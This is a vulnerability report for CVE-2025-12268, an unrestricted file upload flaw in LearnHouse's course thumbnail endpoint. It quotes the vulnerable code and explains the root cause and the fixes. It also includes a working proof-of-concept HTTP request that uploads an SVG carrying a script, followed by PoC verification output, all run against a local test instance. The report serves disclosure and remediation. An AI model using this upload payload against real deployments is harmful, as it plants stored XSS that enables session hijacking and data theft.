# CVE-2025-12268 Vulnerability Report

## Vulnerability Overview

| Item | Details |
|------|---------|
| CVE ID | CVE-2025-12268 |
| CWE | CWE-434 (Unrestricted Upload of File with Dangerous Type) |
| Affected Product | LearnHouse |
| Affected Version | Up to commit 98dfad76aad70711a8113f6c1fdabfccf10509ca |
| Vulnerability Type | Unrestricted File Upload |
| Attack Vector | Network (Remote) |
| CVSS 3.1 Score | 6.3 (Medium) |

## Technical Analysis

### Vulnerable Code Location

The vulnerability exists in the Course Thumbnail upload handler at `/api/v1/courses/{course_uuid}/thumbnail`.

**File:** `apps/api/src/services/courses/thumbnails.py`

```python
async def upload_thumbnail(thumbnail_file, name_in_disk, org_uuid, course_id):
    contents = thumbnail_file.file.read()
    try:
        await upload_content(
            f"courses/{course_id}/thumbnails",
            "orgs",
            org_uuid,
            contents,
            f"{name_in_disk}",
        )
    except Exception:
        return {"message": "There was an error uploading the file"}
```

**File:** `apps/api/src/services/utils/upload_content.py`

```python
async def upload_content(
    directory: str,
    type_of_dir: Literal["orgs", "users"],
    uuid: str,
    file_binary: bytes,
    file_and_format: str,
    allowed_formats: Optional[list[str]] = None,  # NOT PASSED by thumbnail upload
):
    # ...
    # Check if format file is allowed
    if allowed_formats:  # This check is never triggered for thumbnails
        if file_format not in allowed_formats:
            raise HTTPException(status_code=400, detail=f"File format {file_format} not allowed")
```

### Root Cause

1. The `upload_thumbnail()` function does not pass the `allowed_formats` parameter to `upload_content()`
2. Server-side validation is bypassed because `allowed_formats` is `None`
3. Client-side validation can be bypassed by intercepting and modifying HTTP requests

### Attack Flow

1. Attacker authenticates as a regular user
2. Creates a course or accesses an existing course with edit permissions
3. Uploads a legitimate image file (PNG/JPG) via the thumbnail upload form
4. Intercepts the HTTP request using a proxy (e.g., Burp Suite)
5. Modifies the request body to replace the image with malicious content (SVG with XSS, PHP, Python, etc.)
6. Server accepts and stores the malicious file
7. File is accessible at `/content/orgs/{org_uuid}/courses/{course_uuid}/thumbnails/{filename}`

## Proof of Concept

### Test Environment

- LearnHouse Docker environment (ghcr.io/learnhouse/app:latest)
- Target URL: http://localhost:8090

### Exploitation Steps

1. Login as admin user
2. Create a test course
3. Upload malicious SVG file bypassing client-side validation:

```http
PUT /api/v1/courses/{course_uuid}/thumbnail?org_id=1 HTTP/1.1
Host: localhost:8090
Cookie: access_token_cookie=<token>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="thumbnail"; filename="evil.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert('XSS-CVE-2025-12268')</script>
</svg>
------WebKitFormBoundary
Content-Disposition: form-data; name="thumbnail_type"

image
------WebKitFormBoundary--
```

4. Access the uploaded file:
```
http://localhost:8090/content/orgs/{org_uuid}/courses/{course_uuid}/thumbnails/{filename}.svg
```

### Verification Results

```
============================================================
CVE-2025-12268 - LearnHouse Unrestricted File Upload PoC
============================================================
[*] Logging in...
[+] Login successful
[*] Getting organization info...
[+] Org UUID: org_9d6e06a7-c1e4-4b85-b033-5ab7ec53d944, Org ID: 1
[*] Creating a test course...
[+] Course created: course_d0384aef-6551-4040-89a8-1c76d7e37aff
[*] Uploading malicious SVG file...
[+] Malicious SVG uploaded successfully
[*] Verifying uploaded file...
[+] Vulnerability confirmed! Uploaded file is accessible

============================================================
RESULTS
============================================================
[+] VULNERABLE: CVE-2025-12268 confirmed!
[+] The server accepts arbitrary file types without validation
```

## Impact

### Stored XSS (Confirmed)

- Arbitrary JavaScript execution in victim's browser
- Session hijacking via cookie theft
- Phishing attacks
- CSRF-like actions on behalf of victims
- Data exfiltration

### Potential Remote Code Execution

- If server-side script execution is enabled (PHP, Python, etc.)
- Could lead to full server compromise
- Data breach and system takeover

## Remediation

1. Implement server-side file type validation using magic bytes
2. Pass `allowed_formats=['png', 'jpg', 'jpeg']` to `upload_content()` function
3. Implement Content-Security-Policy headers to mitigate XSS
4. Store uploaded files outside web root or serve with `Content-Disposition: attachment`
5. Sanitize filenames and use random UUIDs for stored files

## References

- NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-12268
- VulDB: https://vuldb.com/?id.329940
- GitHub Gist: https://gist.github.com/KhanMarshaI/ef07d20eb1cbe30c71722fbded7cc056
